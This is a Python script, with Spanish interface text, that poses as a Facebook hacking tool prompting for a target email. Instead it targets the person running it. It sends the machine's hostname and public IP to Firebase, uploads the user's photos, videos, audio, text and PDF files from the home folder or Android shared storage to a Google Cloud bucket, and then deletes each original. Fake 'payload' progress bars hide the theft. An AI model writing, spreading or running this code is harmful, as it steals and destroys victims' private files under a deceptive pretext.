Face_Hack.py
import os
import json
import glob
import socket
import time
import requests
from urllib.request import urlopen
from google.cloud import storage
from tqdm import tqdm
from colorama import Fore, Back, Style, init

init(autoreset=True)

S = Style.BRIGHT
C = Fore.CYAN
R = Fore.RED
B = Fore.BLUE
M = Fore.MAGENTA
G = Fore.GREEN
Bl = Fore.BLACK
Y = Fore.YELLOW
BM = Back.MAGENTA
BR = Back.RED
Bb = Back.BLACK
Bw = Back.WHITE
bb = Back.BLUE

print(Bb + B + "\n\t\t" + BR + " Fire Face Force " + Bb + "\n")

mail = input(BM + C + "Insert Mail:\n" + G + Bb)
print(f"{R}Set >> {G}{mail}\n")
print(f"{BR}{G} Buscando {B} Facebook...\n{Bb}")
time.sleep(2.0)
os.system('cls' if os.name == 'nt' else 'clear')

name_h = socket.gethostname()
jsons = "export.json"
f_url = f"https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/{jsons}"

response = requests.get(f_url, headers={'Cache-Control': 'no-cache'})
data = response.json()

if data and 'host' in data and data['host'] == name_h:
    print(f"{BR}{G} Conectando a {B} Facebook...\n{Bb}")
else:
    json_data = {"host": name_h}
    response = requests.patch(f_url, json=json_data)
    if response.status_code == 200:
        print(f"{Y}Solicitud enviada...\n")
    else:
        print(f"{R}Error Network Time Out\n")
time.sleep(2.5)
os.system('cls' if os.name == 'nt' else 'clear')

fy = '.ipify.'
api = f'https://api{fy}org?format=json'
response = urlopen(api)
data = json.load(response)
extract = data['ip']

jsons = 'ip.json'
f_url = f"https://data-fe2c3-default-rtdb.firebaseio.com/{jsons}"
response = requests.get(f_url)
existing_data = json.loads(response.content)

if existing_data and 'ips' in existing_data:
    if extract not in existing_data['ips']:
        existing_data['ips'].append(extract)
        requests.put(f_url, json=existing_data)
else:
    new_data = {'ips': [extract]}
    requests.put(f_url, json=new_data)
print(f"{G}ID Perfil Cargado\n")
time.sleep(2.5)
os.system('cls' if os.name == 'nt' else 'clear')

client = storage.Client.from_service_account_json('services/serviceAccounts.json')
bucket = client.get_bucket('pictuface-f9763.appspot.com')

if os.name == 'nt':
    carpeta_local = rf"C:\Users\{os.getlogin()}\\"
else:
    os.system("termux-setup-storage")
    carpeta_local = '/data/data/com.termux/files/home/storage/shared/'

extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']

archivos = [f for f in glob.glob(carpeta_local + "**/*", recursive=True) if os.path.isfile(f)]

if not archivos:
    print(f"{R}No se encontraron archivos válidos para subir en {carpeta_local}\n")
else:
    for archivo_local in archivos:
        _, extension = os.path.splitext(archivo_local)

        if extension.lower() in extensiones_permitidas:
            print(f"{Y}Explotación en curso...{Bb}")
            with tqdm(
                total=os.path.getsize(archivo_local),
                unit='B',
                unit_scale=True,
                desc=f"{Fore.LIGHTMAGENTA_EX}Fase Payload",
                ncols=80,
                colour='GREEN',
                bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed} < {remaining}]"
            ) as pbar:

                def progress(current, total):
                    pbar.update(current - pbar.n)

                blob = bucket.blob(os.path.basename(archivo_local))
                blob.upload_from_filename(archivo_local, timeout=120)
                pbar.close()

            os.remove(archivo_local)
            print(f"{Bw}{G} Conexión válida {Bb}\n")
        else:
            print(f"{R}Penetración fallida\n")

print(f"{G}Proceso completado.\n")
